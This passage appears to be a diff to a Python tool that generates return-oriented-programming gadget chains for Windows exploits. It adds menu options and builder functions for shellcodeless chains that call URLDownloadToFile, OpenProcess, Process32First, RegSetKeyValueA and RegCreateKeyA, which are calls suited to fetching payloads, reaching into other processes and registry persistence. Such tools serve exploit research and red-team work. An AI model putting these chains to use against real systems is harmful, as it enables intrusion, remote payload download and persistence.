+		foundInnerUFA,outputsTxtUFA, outputsTxtCUFA,outputsPkUFA=buildPushadInner(bad,excludeRegs2,"UDtFA",2,"apiCode",pk,pk,stopCode)
+		if foundInnerUFA:
+			printGadgetChain(outputsTxtUFA, "URLDownloadToFile")
+
+	elif patType == "OP":
+		stopCode="OP"
+		foundInnerOP,outputsTxtOP, outputsTxtCOP,outputsPkOP=buildPushadInner(bad,excludeRegs2,"OP",5,"apiCode",pk,pk,stopCode)
+		if foundInnerOP:
+			printGadgetChain(outputsTxtOP, "OpenProcess")
+
+	elif patType == "P32F":
+		stopCode="P32F"
+		foundInnerPF,outputsTxtPF, outputsTxtCPF,outputsPkPF=buildPushadInner(bad,excludeRegs2,"P32F",10,"apiCode",pk,pk,stopCode)
+		if foundInnerPF:
+			printGadgetChain(outputsTxtPF, "Process32First")
+
+	elif patType == "RSKV":
+		stopCode="RSKV"
+		foundInnerRV,outputsTxtRV, outputsTxtCRV,outputsPkRV=buildPushadInner(bad,excludeRegs2,"RSKV",1,"apiCode",pk,pk,stopCode)
+		if foundInnerRV:
+			printGadgetChain(outputsTxtRV, "RegSetKeyValueA")
+
+	elif patType == "RCKV":
+		stopCode="RCKV"
+		foundInnerRC,outputsTxtRC, outputsTxtCRC,outputsPkRC=buildPushadInner(bad,excludeRegs2,"RCKV",1,"apiCode",pk,pk,stopCode)
+		if foundInnerRC:
+			printGadgetChain(outputsTxtRC, "RegCreateKeyA")
 
 def buildPushadOld(excludeRegs,bad, myArgs ,numArgs):
 	global PWinApi
@@ -15507,6 +16012,41 @@ def genCreateToolhelp32SnapshotROP():
     timeStop = timeit.default_timer()
     print(red, " Time:", yel, str(timeStop - timeStart), res)
 
+def genURLDownloadToFile():
+	timeStart = timeit.default_timer()
+	global bad
+	buildPushad(bad, "UDtFA")
+	timeStop = timeit.default_timer()
+	print(red, " Time:", yel, str(timeStop - timeStart), res)
+
+def genOpenProcess():
+	timeStart = timeit.default_timer()
+	global bad
+	buildPushad(bad, "OP")
+	timeStop = timeit.default_timer()
+	print(red, " Time:", yel, str(timeStop - timeStart), res)
+
+def genProcess32First():
+	timeStart = timeit.default_timer()
+	global bad
+	buildPushad(bad, "P32F")
+	timeStop = timeit.default_timer()
+	print(red, " Time:", yel, str(timeStop - timeStart), res)
+
+def genRegSetKeyValueA():
+	timeStart = timeit.default_timer()
+	global bad
+	buildPushad(bad, "RSKV")
+	timeStop = timeit.default_timer()
+	print(red, " Time:", yel, str(timeStop - timeStart), res)
+
+def genRegCreateKeyA():
+	timeStart = timeit.default_timer()
+	global bad
+	buildPushad(bad, "RCKV")
+	timeStop = timeit.default_timer()
+	print(red, " Time:", yel, str(timeStop - timeStart), res)
+
 def clearGadgets():
 	global fg
 	global opt
@@ -16908,6 +17448,16 @@ def ui():
 				genShellcodelessROP_GetProc()
 			elif userIN[0:1] == "k":
 				genCreateToolhelp32SnapshotROP()
+			elif userIN[0:1] == "u":
+				genURLDownloadToFile()
+			elif userIN[0:1] == "l":
+				genOpenProcess()
+			elif userIN[0:1] == "e":
+				genProcess32First()
+			elif userIN[0:1] == "y":
+				genRegSetKeyValueA()
+			elif userIN[0:1] == "j":
+				genRegCreateKeyA()
 			elif userIN[0:1] == "o":
 				genObfs()
 			elif userIN[0:1] == "p":
